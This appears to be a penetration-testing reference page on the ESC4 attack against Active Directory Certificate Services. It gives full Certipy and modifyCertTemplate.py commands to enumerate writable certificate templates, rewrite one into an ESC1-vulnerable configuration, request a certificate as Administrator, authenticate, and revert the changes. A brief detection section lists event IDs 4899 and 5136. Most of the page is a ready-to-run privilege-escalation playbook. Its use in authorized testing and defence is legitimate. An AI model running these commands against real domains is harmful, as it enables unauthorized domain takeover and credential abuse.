---
title: "Attack #30 — ESC4 Template Write Permissions"
description: "ESC4 exploits overly permissive ACLs on certificate templates. If a low-privileged user has WriteProperty, WriteDACL, WriteOwner, or FullControl on a…"
category: active-directory
subcategory: "ADCS & Certificates"
tags: ["active-directory", "adcs", "privilege-escalation"]
tools: ["Certipy"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Four/🟢 Attack #30 — ESC4 Template Write Permissions.md"
---
# 🟢 Attack #30 — ESC4: Template Write Permissions

***

## 📖 How It Works

ESC4 exploits **overly permissive ACLs on certificate templates**. If a low-privileged user has **WriteProperty, WriteDACL, WriteOwner, or FullControl** on a template object, they can modify that template's configuration to make it vulnerable to ESC1 — enabling the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag, adding Client Authentication EKU, and removing approval requirements. Once modified, the attacker enrolls using the now-vulnerable template to get a certificate for any user.

### The Attack Flow

```
1. Find a template where you have write permissions
2. Modify the template:
   - Enable ENROLLEE_SUPPLIES_SUBJECT (allows SAN specification)
   - Set EKU to Client Authentication
   - Disable Manager Approval
   - Disable Authorized Signatures
3. Request certificate with SAN = Administrator
4. Authenticate as Administrator
5. Revert template changes (cleanup)
```

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Write permissions on template** | WriteProperty, WriteDACL, WriteOwner, or FullControl |
| **Enrollment rights** | Must also be able to enroll for the template |

***

## 💻 Full Commands

### 🔵 Enumerate Writable Templates

```bash
# ── Certipy ───────────────────────────────────────────────────────────────────
certipy find -u low_user@corp.local -p 'Password1' -dc-ip 10.10.10.10 -vulnerable -stdout
# Look for: ESC4 — template ACL allows modification

# ── modifyCertTemplate.py ─────────────────────────────────────────────────────
python3 modifyCertTemplate.py corp.local/low_user:'Password1' -dc-ip 10.10.10.10 \
  -template VulnTemplate -get-acl
```

### 🔴 Modify Template → Convert to ESC1

```bash
# ── Certipy — modify template to be ESC1-vulnerable ──────────────────────────
# Save current config first:
certipy template -u low_user@corp.local -p 'Password1' \
  -template VulnTemplate -save-old -dc-ip 10.10.10.10

# Modify to ESC1:
certipy template -u low_user@corp.local -p 'Password1' \
  -template VulnTemplate -dc-ip 10.10.10.10 \
  -configuration ESC1

# ── Alternative: modifyCertTemplate.py ────────────────────────────────────────
python3 modifyCertTemplate.py corp.local/low_user:'Password1' -dc-ip 10.10.10.10 \
  -template VulnTemplate \
  -add enrollee_supplies_subject \
  -add client_authentication
```

### 🔴 Exploit as ESC1

```bash
# ── Request certificate with SAN = Administrator ─────────────────────────────
certipy req -u low_user@corp.local -p 'Password1' -ca CORP-CA \
  -template VulnTemplate -upn Administrator@corp.local -dc-ip 10.10.10.10

# ── Authenticate ──────────────────────────────────────────────────────────────
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### 🔴 Cleanup — Revert Template

```bash
# ── Restore original template configuration ───────────────────────────────────
certipy template -u low_user@corp.local -p 'Password1' \
  -template VulnTemplate -dc-ip 10.10.10.10 -configuration VulnTemplate.json
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4899** | Security Log (CA) | Certificate template modification |
| **5136** | Security Log (DC) | AD object modification (template object in CN=Certificate Templates) |

***

## 🔗 Attack Chain Context

```
[ESC4] ──→ Write access on template → convert to ESC1 → domain compromise
         │
         ├──→ 🔗 Converts any writable template into ESC1
         ├──→ 📋 Always revert changes after exploitation
         └──→ 💀 Defeated by: restrict template ACLs, monitor 4899/5136
```

***

> ✅ **Attack #30 — ESC4 complete.**
